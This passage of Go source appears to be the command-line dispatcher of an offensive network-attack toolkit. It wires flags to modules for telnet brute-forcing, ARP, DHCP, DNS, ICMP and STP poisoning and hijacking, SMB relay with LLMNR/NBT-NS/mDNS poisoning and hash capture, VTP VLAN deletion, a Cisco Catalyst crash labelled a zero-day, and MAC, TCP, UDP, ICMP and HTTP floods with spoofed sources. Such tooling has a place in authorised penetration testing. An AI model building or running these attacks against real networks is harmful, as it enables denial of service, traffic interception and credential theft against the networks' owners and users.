					p, err := ftpenum.ParseSinglePort(flags.port)
					if err != nil {
						fmt.Fprintf(os.Stderr, "[!] TELNET: invalid --port: %v\n", err)
						os.Exit(1)
					}
					tnPort = p
				}
				if flags.doSMBBrute {
					if flags.userList == "" {
						fmt.Fprintln(os.Stderr, "--telnet --brute requires --userlist <file>")
						os.Exit(1)
					}
					if flags.passList == "" {
						fmt.Fprintln(os.Stderr, "--telnet --brute requires --passlist <file>")
						os.Exit(1)
					}
					if flags.sshThreads < 0 {
						fmt.Fprintln(os.Stderr, "--threads must be >= 0 (0 or omitted uses default 16)")
						os.Exit(1)
					}
					if flags.sshThreads > 64 {
						fmt.Fprintln(os.Stderr, "--threads max is 64")
						os.Exit(1)
					}
					br := &telnetenum.Bruter{
						Target:   flags.snmpTarget,
						Port:     tnPort,
						UserList: flags.userList,
						PassList: flags.passList,
						Threads:  flags.sshThreads,
					}
					if err := br.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] TELNET: %v\n", err)
						os.Exit(1)
					}
					return
				}
				en := &telnetenum.Enumerator{
					Target: flags.snmpTarget,
					Port:   tnPort,
				}
				if err := en.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] TELNET: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doMemcachedFlush {
				fmt.Fprintln(os.Stderr, "--flush-all requires --memcached")
				os.Exit(1)
			}
			if flags.memcachedSet != "" && flags.memcachedSet != "true" {
				fmt.Fprintln(os.Stderr, "--set requires --memcached (or use --snmp --set for SNMP SET)")
				os.Exit(1)
			}
			if flags.memcachedSet == "true" && !flags.doSNMP {
				fmt.Fprintln(os.Stderr, "--set requires --snmp (SNMP SET) or --memcached with a key")
				os.Exit(1)
			}
			if flags.memcachedDelete != "" {
				fmt.Fprintln(os.Stderr, "--delete requires --memcached")
				os.Exit(1)
			}
			if flags.memcachedValue != "" && flags.memcachedSet == "" {
				fmt.Fprintln(os.Stderr, "--value requires --memcached --set or --snmp --set")
				os.Exit(1)
			}

			if flags.doICMPMitM {
				if !flags.doICMPRedirect {
					fmt.Fprintln(os.Stderr, "--icmp requires --redirect")
					os.Exit(1)
				}
				if flags.snmpTarget == "" {
					fmt.Fprintln(os.Stderr, "--icmp --redirect requires --target <ip|range>")
					os.Exit(1)
				}
				if ifaceName == "" {
					fmt.Fprintln(os.Stderr, "--icmp --redirect requires -I <iface>")
					os.Exit(1)
				}
				r := &icmpredirect.Redirector{
					Interface: ifaceName,
					Target:    flags.snmpTarget,
				}
				if err := r.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] ICMP: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDNSMitM {
				if !flags.doHijack {
					fmt.Fprintln(os.Stderr, "--dns requires --hijack")
					os.Exit(1)
				}
				if flags.snmpTarget == "" {
					fmt.Fprintln(os.Stderr, "--dns --hijack requires --target <ip|range>")
					os.Exit(1)
				}
				if ifaceName == "" {
					fmt.Fprintln(os.Stderr, "--dns --hijack requires -I <iface>")
					os.Exit(1)
				}
				h := &dns.Hijacker{
					Interface:   ifaceName,
					Target:      flags.snmpTarget,
					SpoofDomain: flags.dnsSpoofDomain,
				}
				if err := h.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] DNS: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDot1X && flags.doMitm {
				if enumOn(flags) {
					fmt.Fprintln(os.Stderr, "--802.1x --mitm cannot be combined with --enum")
					os.Exit(1)
				}
				if flags.iface1 == "" || flags.iface2 == "" {
					fmt.Fprintln(os.Stderr, "--802.1x --mitm requires --interface1 and --interface2")
					os.Exit(1)
				}
				if flags.eapInfo != "" {
					fmt.Fprintln(os.Stderr, "--eapinfo is only valid with --802.1x --enum")
					os.Exit(1)
				}
				m := &dot1xmitm.MitM{
					Interface1: flags.iface1,
					Interface2: flags.iface2,
					SourceMAC:  flags.srcMAC,
				}
				if err := m.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] 802.1X-MITM: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDot1Q && flags.doArpPoison {
				if enumOn(flags) || flags.doDoubleTag {
					fmt.Fprintln(os.Stderr, "--802.1q --arp-poison cannot be combined with --enum or --double-tag")
					os.Exit(1)
				}
				if ifaceName == "" {
					fmt.Fprintln(os.Stderr, "--802.1q --arp-poison requires -I <iface>")
					os.Exit(1)
				}
				if flags.dstVLAN < 0 {
					fmt.Fprintln(os.Stderr, "--802.1q --arp-poison requires --dst-vlan")
					os.Exit(1)
				}
				if flags.dot1qDstIP == "" {
					fmt.Fprintln(os.Stderr, "--802.1q --arp-poison requires --dst-ip")
					os.Exit(1)
				}
				if flags.dot1qSrcIP == "" {
					fmt.Fprintln(os.Stderr, "--802.1q --arp-poison requires --src-ip")
					os.Exit(1)
				}
				p := &dot1qpoison.Poisoner{
					Interface: ifaceName,
					SourceMAC: flags.srcMAC,
					DstVLAN:   flags.dstVLAN,
					DstIP:     flags.dot1qDstIP,
					SrcIP:     flags.dot1qSrcIP,
					Payload:   flags.icmpPayload,
				}
				if err := p.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] 802.1Q-ARP-POISON: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doInject && !flags.doCDP {
				fmt.Fprintln(os.Stderr, "--inject requires --cdp")
				os.Exit(1)
			}
			if enumOn(flags) && !flags.doCDP && !flags.doDTP && !flags.doDHCPEnum && !flags.doSMB && !flags.doSNMP && !flags.doMemcached && !flags.doTelnet && !(flags.doDot1Q && enumOn(flags)) && !(flags.doDot1X && enumOn(flags)) {
				fmt.Fprintln(os.Stderr, "--enum requires --cdp, --dtp, --dhcp, --802.1q, --802.1x, --smb, --snmp, --memcached, or --telnet")
				os.Exit(1)
			}
			if flags.doDHCPEnum {
				dhcpModes := 0
				if enumOn(flags) {
					dhcpModes++
				}
				if flags.doDHCPRogue {
					dhcpModes++
				}
				if dhcpModes != 1 {
					fmt.Fprintln(os.Stderr, "--dhcp requires exactly one of --enum or --rouge")
					os.Exit(1)
				}
			}
			if flags.doDHCPRogue && !flags.doDHCPEnum {
				fmt.Fprintln(os.Stderr, "--rouge requires --dhcp")
				os.Exit(1)
			}
			if flags.doDoubleTag && !flags.doDot1Q {
				fmt.Fprintln(os.Stderr, "--double-tag requires --802.1q")
				os.Exit(1)
			}
			if flags.doArpPoison && !flags.doDot1Q {
				fmt.Fprintln(os.Stderr, "--arp-poison requires --802.1q")
				os.Exit(1)
			}
			if flags.doDot1Q {
				modes := 0
				if enumOn(flags) {
					modes++
				}
				if flags.doDoubleTag {
					modes++
				}
				if flags.doArpPoison {
					modes++
				}
				if modes != 1 {
					fmt.Fprintln(os.Stderr, "--802.1q requires exactly one of --enum, --double-tag, or --arp-poison")
					os.Exit(1)
				}
			}
			if flags.doMitm && !flags.doDot1X {
				fmt.Fprintln(os.Stderr, "--mitm requires --802.1x")
				os.Exit(1)
			}
			if flags.doDot1X && enumOn(flags) == flags.doMitm {
				fmt.Fprintln(os.Stderr, "--802.1x requires exactly one of --enum or --mitm")
				os.Exit(1)
			}
			if flags.eapInfo != "" && (!flags.doDot1X || flags.doMitm || !enumOn(flags)) {
				fmt.Fprintln(os.Stderr, "--eapinfo requires --802.1x --enum")
				os.Exit(1)
			}
			if flags.icmpPayload != "" && (!flags.doDot1Q || (!enumOn(flags) && !flags.doDoubleTag && !flags.doArpPoison)) {
				fmt.Fprintln(os.Stderr, "--payload requires --802.1q with --enum, --double-tag, or --arp-poison")
				os.Exit(1)
			}
			if flags.srcVLAN >= 0 && (!flags.doDot1Q || !flags.doDoubleTag) {
				fmt.Fprintln(os.Stderr, "--src-vlan requires --802.1q --double-tag")
				os.Exit(1)
			}
			if flags.dstVLAN >= 0 && (!flags.doDot1Q || (!flags.doDoubleTag && !flags.doArpPoison)) && !flags.doDeleteVlan && !flags.doAddVlan {
				fmt.Fprintln(os.Stderr, "--dst-vlan requires --802.1q with --double-tag or --arp-poison, or --vtp with --delete-vlan or --add-vlan")
				os.Exit(1)
			}
			if flags.doDoubleTag && (flags.srcVLAN < 0 || flags.dstVLAN < 0) {
				fmt.Fprintln(os.Stderr, "--802.1q --double-tag requires --src-vlan and --dst-vlan")
				os.Exit(1)
			}
			if flags.doArpPoison && flags.dstVLAN < 0 {
				fmt.Fprintln(os.Stderr, "--802.1q --arp-poison requires --dst-vlan")
				os.Exit(1)
			}
			if flags.dot1qDstIP != "" && (!flags.doDot1Q || !flags.doArpPoison) {
				fmt.Fprintln(os.Stderr, "--dst-ip requires --802.1q --arp-poison")
				os.Exit(1)
			}
			if flags.dot1qSrcIP != "" && (!flags.doDot1Q || !flags.doArpPoison) {
				fmt.Fprintln(os.Stderr, "--src-ip requires --802.1q --arp-poison")
				os.Exit(1)
			}
			if flags.doEnableTrunk && !flags.doDTP {
				fmt.Fprintln(os.Stderr, "--enable-trunk requires --dtp")
				os.Exit(1)
			}
			igModes := 0
			if flags.doCDP {
				igModes++
			}
			if flags.doDTP {
				igModes++
			}
			if flags.doDHCPEnum && enumOn(flags) {
				igModes++
			}
			if flags.doDot1Q && enumOn(flags) {
				igModes++
			}
			if flags.doDot1X && enumOn(flags) {
				igModes++
			}
			if igModes > 1 {
				fmt.Fprintln(os.Stderr, "--cdp, --dtp, --dhcp, --802.1q, and --802.1x cannot be combined; choose one per run")
				os.Exit(1)
			}

			if ifaceName == "" {
				fmt.Fprintln(os.Stderr, "-I / --interface is required for this operation")
				cmd.Help()
				os.Exit(1)
			}

			if flags.doSTPFloodConf || flags.doSTPFloodTCN {
				f := &stpflood.Flooder{
					Interface: ifaceName,
					Count:     flags.floodCount,
					Rate:      flags.floodRate,
					TCN:       flags.doSTPFloodTCN,
				}
				if err := f.Run(); err != nil {
					label := "STP-FLOOD-CONF"
					if flags.doSTPFloodTCN {
						label = "STP-FLOOD-TCN"
					}
					fmt.Fprintf(os.Stderr, "[!] %s: %v\n", label, err)
					os.Exit(1)
				}
				return
			}

			if flags.doSTP || flags.doRSTP {
				if !flags.doHijack {
					fmt.Fprintln(os.Stderr, "--stp/--rstp requires --hijack")
					os.Exit(1)
				}
				if flags.doSTP && flags.doRSTP {
					fmt.Fprintln(os.Stderr, "--stp and --rstp cannot be combined; choose one per run")
					os.Exit(1)
				}
				if flags.stpMAC == "" {
					fmt.Fprintln(os.Stderr, "--stp/--rstp requires --mac <mac-address>")
					os.Exit(1)
				}
				h := &stp.Hijacker{
					Interface: ifaceName,
					MAC:       flags.stpMAC,
					RSTP:      flags.doRSTP,
				}
				if err := h.Run(); err != nil {
					tag := "STP"
					if flags.doRSTP {
						tag = "RSTP"
					}
					fmt.Fprintf(os.Stderr, "[!] %s: %v\n", tag, err)
					os.Exit(1)
				}
				return
			}

			if flags.doARP {
				modes := 0
				if flags.doScan {
					modes++
				}
				if flags.doPoison {
					modes++
				}
				if flags.doARPCage {
					modes++
				}
				if modes != 1 {
					fmt.Fprintln(os.Stderr, "--arp requires exactly one of --scan, --poison, or --cage")
					os.Exit(1)
				}
				switch {
				case flags.doARPCage:
					if flags.arpSubnet == "" {
						fmt.Fprintln(os.Stderr, "--arp --cage requires --subnet <cidr>")
						os.Exit(1)
					}
					if flags.snmpTarget == "" {
						fmt.Fprintln(os.Stderr, "--arp --cage requires --target <ip|range>")
						os.Exit(1)
					}
					c := &arpdos.Cage{
						Interface: ifaceName,
						Subnet:    flags.arpSubnet,
						Target:    flags.snmpTarget,
					}
					if err := c.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] ARP: %v\n", err)
						os.Exit(1)
					}
				case flags.doScan:
					s := &arp.Scanner{Interface: ifaceName}
					if err := s.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] ARP: %v\n", err)
						os.Exit(1)
					}
				case flags.doPoison:
					if flags.ip == "" {
						fmt.Fprintln(os.Stderr, "--poison requires --ip <ip[,ip...]>")
						os.Exit(1)
					}
					p := &arp.Poisoner{Interface: ifaceName, Targets: strings.Split(flags.ip, ",")}
					if err := p.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] ARP: %v\n", err)
						os.Exit(1)
					}
				}
				return
			}

			if flags.doDHCPEnum && flags.doDHCPRogue {
				if ifaceName == "" {
					fmt.Fprintln(os.Stderr, "-I / --interface is required for --dhcp --rouge")
					os.Exit(1)
				}
				rs := &dhcp.RogueServer{Interface: ifaceName}
				if err := rs.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] DHCP-ROGUE: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDHCPSpoofing {
				p := &dhcp.Poisoner{Interface: ifaceName}
				if err := p.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] DHCP: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDHCPv6Spoofing {
				sp := &dhcpv6.Spoofer{Interface: ifaceName}
				if err := sp.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] DHCPv6: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doSMBRelay {
				if flags.relayTo == "" {
					fmt.Fprintln(os.Stderr, "--smb-relay requires --relay-to <ip> (--relay-from is optional).")
					os.Exit(1)
				}
				r := &smbrelay.Relayer{Interface: ifaceName, RelayFrom: flags.relayFrom, RelayTo: flags.relayTo}
				if err := r.Prepare(); err != nil {
					if !errors.Is(err, smbrelay.ErrAttackCancelled) {
						fmt.Fprintf(os.Stderr, "[!] SMB: %v\n", err)
					}
					os.Exit(1)
				}
				for _, run := range []func() error{
					(&llmnr.Poisoner{Interface: ifaceName, RelayFrom: flags.relayFrom}).Run,
					(&nbns.Poisoner{Interface: ifaceName, RelayFrom: flags.relayFrom}).Run,
					(&mdns.Poisoner{Interface: ifaceName, RelayFrom: flags.relayFrom}).Run,
				} {
					run := run
					go func() {
						if err := run(); err != nil {
							fmt.Fprintf(os.Stderr, "[!] poisoner: %v\n", err)
						}
					}()
				}
				if err := r.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] SMB: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doVTPAnalysis && (flags.doDeleteAllVlans || flags.doDeleteVlan) {
				if ifaceName == "" {
					fmt.Fprintln(os.Stderr, "--vtp DoS requires -I <iface>")
					os.Exit(1)
				}
				d := &vtpdelete.Deleter{
					Interface:      ifaceName,
					RevisionNumber: flags.vtpRevision,
					SourceMAC:      flags.srcMAC,
				}
				if flags.doDeleteVlan {
					d.TargetVLAN = uint16(flags.dstVLAN)
				}
				if err := d.Run(); err != nil {
					label := "VTP-DELETE-ALL"
					if flags.doDeleteVlan {
						label = "VTP-DELETE-VLAN"
					}
					fmt.Fprintf(os.Stderr, "[!] %s: %v\n", label, err)
					os.Exit(1)
				}
				return
			}

			if flags.doVTPAnalysis && flags.doCatalystZeroDay {
				if ifaceName == "" {
					fmt.Fprintln(os.Stderr, "--vtp --dos --catalyst-zero-day requires -I <iface>")
					os.Exit(1)
				}
				c := &vtpcrash.Crasher{
					Interface:      ifaceName,
					RevisionNumber: flags.vtpRevision,
					SourceMAC:      flags.srcMAC,
				}
				if err := c.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] VTP-CATALYST-ZERO-DAY: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doVTPAnalysis && flags.doAddVlan {
				if ifaceName == "" {
					fmt.Fprintln(os.Stderr, "--vtp --add-vlan requires -I <iface>")
					os.Exit(1)
				}
				a := &vtpadd.Adder{
					Interface:      ifaceName,
					TargetVLAN:     uint16(flags.dstVLAN),
					VlanName:       flags.vlanName,
					RevisionNumber: flags.vtpRevision,
					SourceMAC:      flags.srcMAC,
				}
				if err := a.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] VTP-ADD-VLAN: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doMACFlood {
				f := &macflood.Flooder{Interface: ifaceName, Count: flags.floodCount, Rate: flags.floodRate}
				if err := f.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] MAC-FLOOD: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doCDPFlood {
				f := &cdpflood.Flooder{Interface: ifaceName, Rate: flags.cdpRate}
				if err := f.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] CDP-FLOOD: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDHCPFlood {
				if flags.dhcpPool == "" {
					fmt.Fprintln(os.Stderr, "--dhcp-flood requires --dhcp-pool <range> (e.g. 192.168.100.2-254)")
					os.Exit(1)
				}
				dhcpModes := 0
				if flags.doDHCPDiscover {
					dhcpModes++
				}
				if flags.doDHCPRelease {
					dhcpModes++
				}
				if dhcpModes != 1 {
					fmt.Fprintln(os.Stderr, "--dhcp-flood requires exactly one of --discover or --release")
					os.Exit(1)
				}
				f := &dhcpflood.Flooder{
					Interface: ifaceName,
					Pool:      flags.dhcpPool,
					Rate:      flags.dhcpRate,
					Discover:  flags.doDHCPDiscover,
					Release:   flags.doDHCPRelease,
				}
				if err := f.Run(); err != nil {
					label := "DHCP-DISCOVER"
					if flags.doDHCPRelease {
						label = "DHCP-RELEASE"
					}
					fmt.Fprintf(os.Stderr, "[!] %s: %v\n", label, err)
					os.Exit(1)
				}
				return
			}

			if flags.doICMPFlood {
				if flags.ip == "" {
					fmt.Fprintln(os.Stderr, "--icmp-flood requires --ip <target>")
					os.Exit(1)
				}
				target := strings.SplitN(flags.ip, ",", 2)[0]
				f := &icmpflood.Flooder{
					Interface:    ifaceName,
					Target:       target,
					Count:        flags.floodCount,
					Rate:         flags.floodRate,
					RandomSource: flags.randomSource,
				}
				if err := f.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] ICMP-FLOOD: %v\n", err)
					os.Exit(1)
				}
				return
			}

			var tcpMode tcpflood.Mode
			var doTCPFlood bool
			switch {
			case flags.doTCPSyn:
				tcpMode, doTCPFlood = tcpflood.ModeSYN, true
			case flags.doTCPAck:
				tcpMode, doTCPFlood = tcpflood.ModeACK, true
			case flags.doTCPRst:
				tcpMode, doTCPFlood = tcpflood.ModeRST, true
			case flags.doTCPPsh:
				tcpMode, doTCPFlood = tcpflood.ModePSH, true
			case flags.doTCPZeroWin:
				tcpMode, doTCPFlood = tcpflood.ModeZeroWindow, true
			case flags.doTCPNull:
				tcpMode, doTCPFlood = tcpflood.ModeNULL, true
			case flags.doTCPOutOfOrder:
				tcpMode, doTCPFlood = tcpflood.ModeOutOfOrder, true
			case flags.doTCPXmas:
				tcpMode, doTCPFlood = tcpflood.ModeXmas, true
			case flags.doTCPFin:
				tcpMode, doTCPFlood = tcpflood.ModeFIN, true
			}
			if doTCPFlood {
				if flags.ip == "" {
					fmt.Fprintln(os.Stderr, "--tcp-*-flood requires --ip <target>")
					os.Exit(1)
				}
				tcpPort, err := ftpenum.ParseSinglePort(flags.port)
				if err != nil || tcpPort == 0 {
					fmt.Fprintln(os.Stderr, "--tcp-*-flood requires --port <port>")
					os.Exit(1)
				}
				target := strings.SplitN(flags.ip, ",", 2)[0]
				f := &tcpflood.Flooder{
					Interface:    ifaceName,
					Target:       target,
					Port:         uint16(tcpPort),
					Mode:         tcpMode,
					Count:        flags.floodCount,
					Rate:         flags.floodRate,
					RandomSource: flags.randomSource,
				}
				if err := f.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] TCP-FLOOD: %v\n", err)
					os.Exit(1)
				}
				return
			}

			var udpMode udpflood.Mode
			var doUDPFlood bool
			switch {
			case flags.doUDPNormal:
				udpMode, doUDPFlood = udpflood.ModeNormal, true
			case flags.doUDPZeroLen:
				udpMode, doUDPFlood = udpflood.ModeZeroLength, true
			case flags.doUDPRandCksum:
				udpMode, doUDPFlood = udpflood.ModeRandomChecksum, true
			case flags.doUDPZeroCksum:
				udpMode, doUDPFlood = udpflood.ModeZeroChecksum, true
			}
			if doUDPFlood {
				if flags.ip == "" {
					fmt.Fprintln(os.Stderr, "--udp-*-flood requires --ip <target>")
					os.Exit(1)
				}
				udpPort, err := ftpenum.ParseSinglePort(flags.port)
				if err != nil || udpPort == 0 {
					fmt.Fprintln(os.Stderr, "--udp-*-flood requires --port <port>")
					os.Exit(1)
				}
				target := strings.SplitN(flags.ip, ",", 2)[0]
				f := &udpflood.Flooder{
					Interface:    ifaceName,
					Target:       target,
					Port:         uint16(udpPort),
					Mode:         udpMode,
					Count:        flags.floodCount,
					Rate:         flags.floodRate,
					RandomSource: flags.randomSource,
				}
				if err := f.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] UDP-FLOOD: %v\n", err)
					os.Exit(1)
				}
				return
			}

			var httpMode httpflood.Mode
			var doHTTPFlood bool
			switch {
			case flags.doHTTP10DOS:
				httpMode, doHTTPFlood = httpflood.ModeHTTP10, true
			case flags.doHTTP11DOS:
				httpMode, doHTTPFlood = httpflood.ModeHTTP11, true
			case flags.doHTTP2DOS:
				httpMode, doHTTPFlood = httpflood.ModeHTTP2, true
			case flags.doHTTP3DOS:
				httpMode, doHTTPFlood = httpflood.ModeHTTP3, true
			}
			if doHTTPFlood {
				if flags.ip == "" {
					fmt.Fprintln(os.Stderr, "--http*-dos requires --ip <target>")
					os.Exit(1)
				}
				httpPort, err := ftpenum.ParseSinglePort(flags.port)
				if err != nil {
					fmt.Fprintf(os.Stderr, "[!] HTTP-FLOOD: invalid --port: %v\n", err)
					os.Exit(1)
				}
				port := uint16(httpPort)
				if port == 0 {
					if httpMode == httpflood.ModeHTTP10 || httpMode == httpflood.ModeHTTP11 {
						port = 80
					} else {
						port = 443
					}
				}
				hf := &httpflood.Flooder{
					Interface: ifaceName,
					Target:    flags.ip,
					Port:      port,
					Mode:      httpMode,
					Count:     flags.floodCount,
					Rate:      flags.floodRate,
				}
				if err := hf.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] HTTP-FLOOD: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doARPScan {
				switch {
				case !flags.doActive && !flags.doPassive:
					fmt.Fprintln(os.Stderr, "--arp-scan requires --active or --passive")
					os.Exit(1)
				case flags.doActive && flags.doPassive:
					fmt.Fprintln(os.Stderr, "--active and --passive cannot be used together")
					os.Exit(1)
				}
				sc := &arpscan.Scanner{
					Interface: ifaceName,
					Range:     flags.arpRange,
					Passive:   flags.doPassive,
				}
				if err := sc.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] ARP-SCAN: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doCDP {
				if enumOn(flags) == flags.doInject {
					fmt.Fprintln(os.Stderr, "--cdp requires exactly one of --enum or --inject")
					os.Exit(1)
				}
				if enumOn(flags) {
					e := &cdpenum.Enumerator{
						Interface: ifaceName,
						SourceMAC: flags.srcMAC,
					}
					if err := e.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] CDP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				inj := &cdpinject.Injector{
					Interface: ifaceName,
					SourceMAC: flags.srcMAC,
				}
				if err := inj.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] CDP-INJECT: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDTP {
				if enumOn(flags) == flags.doEnableTrunk {
					fmt.Fprintln(os.Stderr, "--dtp requires exactly one of --enum or --enable-trunk")
					os.Exit(1)
				}
				if enumOn(flags) {
					e := &dtpenum.Enumerator{
						Interface: ifaceName,
						SourceMAC: flags.srcMAC,
					}
					if err := e.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] DTP: %v\n", err)
						os.Exit(1)
					}
					return
				}
				en := &dtpinject.Enabler{
					Interface: ifaceName,
					SourceMAC: flags.srcMAC,
				}
				if err := en.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] DTP-ENABLE-TRUNK: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDHCPEnum && enumOn(flags) {
				e := &dhcpenum.Enumerator{
					Interface: ifaceName,
				}
				if err := e.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] DHCP: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDot1Q && flags.doDoubleTag {
				dt := &dot1qdouble.DoubleTagger{
					Interface: ifaceName,
					SourceMAC: flags.srcMAC,
					SrcVLAN:   flags.srcVLAN,
					DstVLAN:   flags.dstVLAN,
					Payload:   flags.icmpPayload,
				}
				if err := dt.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] 802.1Q-DOUBLE-TAG: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDot1Q {
				e := &dot1qenum.Enumerator{
					Interface: ifaceName,
					SourceMAC: flags.srcMAC,
					Payload:   flags.icmpPayload,
				}
				if err := e.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] 802.1Q: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if flags.doDot1X && enumOn(flags) {
				e := &dot1xenum.Enumerator{
					Interface: ifaceName,
					SourceMAC: flags.srcMAC,
					EAPInfo:   flags.eapInfo,
				}
				if err := e.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] 802.1X: %v\n", err)
					os.Exit(1)
				}
				return
			}

			if !flags.doLLMNR && !flags.doNBTNS && !flags.doMDNS {
				fmt.Fprintln(os.Stderr, "No modules enabled.")
				cmd.Help()
				os.Exit(1)
			}

			var wg sync.WaitGroup

			// SMB hash-capture server starts automatically with any poisoner
			wg.Add(1)
			go func() {
				defer wg.Done()
				srv := &smb.Server{}
				if err := srv.Run(); err != nil {
					fmt.Fprintf(os.Stderr, "[!] SMB: %v\n", err)
					os.Exit(1)
				}
			}()

			if flags.doLLMNR {
				wg.Add(1)
				go func() {
					defer wg.Done()
					p := &llmnr.Poisoner{Interface: ifaceName}
					if err := p.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] LLMNR: %v\n", err)
						os.Exit(1)
					}
				}()
			}

			if flags.doNBTNS {
				wg.Add(1)
				go func() {
					defer wg.Done()
					p := &nbns.Poisoner{Interface: ifaceName}
					if err := p.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] NBT-NS: %v\n", err)
						os.Exit(1)
					}
				}()
			}

			if flags.doMDNS {
				wg.Add(1)
				go func() {
					defer wg.Done()
					p := &mdns.Poisoner{Interface: ifaceName}
					if err := p.Run(); err != nil {
						fmt.Fprintf(os.Stderr, "[!] MDNS: %v\n", err)
						os.Exit(1)
					}
				}()
			}

			wg.Wait()
		},
	}

	rootCmd.Flags().SetInterspersed(true)

	// Shared
	rootCmd.Flags().StringVarP(&flags.iface, "interface", "I", "", "Network interface to listen on (e.g. eth0)")
	rootCmd.Flags().StringVar(&flags.ip, "ip", "", "Target IP(s): comma-separated for --arp --poison; single IPv4 for flood modes")
	rootCmd.Flags().StringVar(&flags.port, "port", "", "Non-default port number")
	rootCmd.Flags().IntVar(&flags.floodCount, "flood-count", 0, "Unique MAC addresses (default 20000 for mac-flood; 0=live random for stp); other floods: total packets (0=unlimited)")
	rootCmd.Flags().IntVar(&flags.floodRate, "flood-rate", 0, "Packets per second for flood modes (default: full speed)")
	rootCmd.Flags().BoolVar(&flags.randomSource, "random-source", false, "Spoof a random source IP per packet (ICMP/TCP/UDP flood)")

	// MitM — Name Resolution Poisoning
	rootCmd.Flags().BoolVar(&flags.doLLMNR, "llmnr", false, "LLMNR poisoner (UDP multicast :5355)")
	rootCmd.Flags().BoolVar(&flags.doNBTNS, "nbt-ns", false, "NBT-NS poisoner (UDP broadcast :137)")
	rootCmd.Flags().BoolVar(&flags.doMDNS, "mdns", false, "mDNS poisoner (224.0.0.251:5353 + ff02::fb:5353)")

	// MitM — ARP Poisoning
	rootCmd.Flags().BoolVar(&flags.doARP, "arp", false, "ARP/NDP mode")
	rootCmd.Flags().BoolVar(&flags.doScan, "scan", false, "Scan the interface subnet for live hosts (use with --arp)")
	rootCmd.Flags().BoolVar(&flags.doPoison, "poison", false, "Poison the ARP/NDP cache for targets (use with --arp)")
	rootCmd.Flags().BoolVar(&flags.doARPCage, "cage", false, "Poison target cache with random neighbor MACs")
	rootCmd.Flags().StringVar(&flags.arpSubnet, "subnet", "", "Subnet to probe (e.g. 192.168.1.0/24)")

	// MitM — DHCP
	rootCmd.Flags().BoolVar(&flags.doDHCPSpoofing, "dhcp-spoofing", false, "DHCPv4 spoofing — race legitimate server (requires root)")
	rootCmd.Flags().BoolVar(&flags.doDHCPRogue, "rouge", false, "DHCP rogue server")
	rootCmd.Flags().BoolVar(&flags.doDHCPv6Spoofing, "dhcpv6-spoofing", false, "DHCPv6 spoofing with ICMPv6 RA — rogue DHCPv6 server (requires root)")

	// MitM — STP
	rootCmd.Flags().BoolVar(&flags.doSTP, "stp", false, "STP Protocol")
	rootCmd.Flags().BoolVar(&flags.doRSTP, "rstp", false, "RSTP Protocol")
	rootCmd.Flags().BoolVar(&flags.doSTPFloodConf, "flood-conf", false, "STP conf BPDU DoS flood")
	rootCmd.Flags().BoolVar(&flags.doSTPFloodTCN, "flood-tcn", false, "STP TCN BPDU DoS flood")
	rootCmd.Flags().StringVar(&flags.stpMAC, "mac", "", "Attacker MAC address")
	rootCmd.Flags().BoolVar(&flags.doHijack, "hijack", false, "Protocol hijacking")

	// MitM — DNS
	rootCmd.Flags().BoolVar(&flags.doDNSMitM, "dns", false, "DNS Protocol")
	rootCmd.Flags().StringVar(&flags.dnsSpoofDomain, "spoof-domain", "", "DNS Domain(s) to spoof")

	// MitM — ICMP
	rootCmd.Flags().BoolVar(&flags.doICMPMitM, "icmp", false, "ICMP Protocol")
	rootCmd.Flags().BoolVar(&flags.doICMPRedirect, "redirect", false, "ICMP redirect attack")

	// MitM — 802.1X
	rootCmd.Flags().BoolVar(&flags.doMitm, "mitm", false, "Perform Man-in-the-middle attack")
